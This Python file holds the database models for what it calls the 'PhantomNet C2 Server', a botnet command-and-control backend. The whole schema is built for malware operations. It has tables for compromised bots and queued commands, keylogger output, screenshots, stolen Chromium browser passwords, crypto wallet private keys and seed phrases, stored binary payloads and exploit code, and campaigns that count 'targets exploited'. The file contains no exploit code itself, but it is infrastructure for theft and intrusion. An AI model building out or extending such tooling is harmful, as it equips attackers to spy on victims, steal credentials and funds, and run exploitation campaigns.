"""
Database models for PhantomNet C2 Server
"""

from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

class Admin(db.Model):
    """Admin user model"""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)

class Bot(db.Model):
    """Bot/client model"""
    id = db.Column(db.String(50), primary_key=True)
    ip_address = db.Column(db.String(45))
    hostname = db.Column(db.String(100))
    os_info = db.Column(db.String(100))
    username = db.Column(db.String(100))
    registered_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime)
    status = db.Column(db.String(20), default='active')
    capabilities = db.Column(db.Text)  # JSON string
    session_token = db.Column(db.String(100))

class Command(db.Model):
    """Command model"""
    id = db.Column(db.String(50), primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    command = db.Column(db.Text, nullable=False)
    args = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='pending')
    result = db.Column(db.Text)

class SystemInfo(db.Model):
    """System information model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    system_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class NetworkScan(db.Model):
    """Network scan data model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    scan_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class ProcessList(db.Model):
    """Process list data model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    process_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class FileSystem(db.Model):
    """File system data model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    path = db.Column(db.String(500))
    file_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class RegistryData(db.Model):
    """Registry data model (Windows-specific)"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    registry_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Screenshot(db.Model):
    """Screenshot data model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    screenshot_data = db.Column(db.Text)  # Base64 encoded image
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class KeyloggerData(db.Model):
    """Keylogger data model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    keystroke_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class ChromiumCredentials(db.Model):
    """Chromium browser credentials model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    url = db.Column(db.String(500))
    username = db.Column(db.String(200))
    password = db.Column(db.String(200))
    browser = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class CryptoWallet(db.Model):
    """Cryptocurrency wallet data model"""
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    wallet_name = db.Column(db.String(50))
    wallet_path = db.Column(db.String(500))
    wallet_data = db.Column(db.Text)  # JSON string of wallet contents
    private_key = db.Column(db.String(500))
    mnemonic_phrase = db.Column(db.String(500))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class DuckDNSUpdater(db.Model):
    """DuckDNS configuration model"""
    id = db.Column(db.Integer, primary_key=True)
    domain = db.Column(db.String(100), nullable=False)
    token = db.Column(db.String(100), nullable=False)
    last_update = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True)

class Payload(db.Model):
    """Payload model for advanced C2 operations"""
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    payload_type = db.Column(db.String(50))  # exe, dll, shellcode, etc.
    platform = db.Column(db.String(20))  # windows, linux, macos
    architecture = db.Column(db.String(10))  # x86, x64
    payload_data = db.Column(db.LargeBinary)  # Binary payload
    encryption_key = db.Column(db.String(100))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)

class Target(db.Model):
    """Target model for reconnaissance"""
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45))
    hostname = db.Column(db.String(100))
    os_info = db.Column(db.String(100))
    open_ports = db.Column(db.Text)  # JSON string
    vulnerabilities = db.Column(db.Text)  # JSON string
    services = db.Column(db.Text)  # JSON string
    discovered_at = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='discovered')  # discovered, exploited, failed
    exploitation_method = db.Column(db.String(50))
    notes = db.Column(db.Text)

class Campaign(db.Model):
    """Campaign model for organized operations"""
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    payload_id = db.Column(db.Integer, db.ForeignKey('payload.id'))
    target_criteria = db.Column(db.Text)  # JSON string
    status = db.Column(db.String(20), default='active')  # active, paused, completed
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    targets_discovered = db.Column(db.Integer, default=0)
    targets_exploited = db.Column(db.Integer, default=0)
    success_rate = db.Column(db.Float, default=0.0)

class Exploit(db.Model):
    """Exploit model"""
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    exploit_type = db.Column(db.String(50))  # rce, lfi, sqli, etc.
    target_platform = db.Column(db.String(20))
    cve_id = db.Column(db.String(20))
    exploit_code = db.Column(db.Text)
    success_rate = db.Column(db.Float, default=0.0)
    is_active = db.Column(db.Boolean, default=True)

class Task(db.Model):
    """Task model for advanced operations"""
    id = db.Column(db.String(50), primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    task_type = db.Column(db.String(50))  # execute, download, upload, scan, etc.
    command = db.Column(db.Text, nullable=False)
    args = db.Column(db.Text)  # JSON string
    payload_id = db.Column(db.Integer, db.ForeignKey('payload.id'))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='pending')  # pending, running, completed, failed
    result = db.Column(db.Text)
    execution_time = db.Column(db.Float)  # seconds
    output = db.Column(db.Text)  # command output
    error = db.Column(db.Text)  # error message if failed
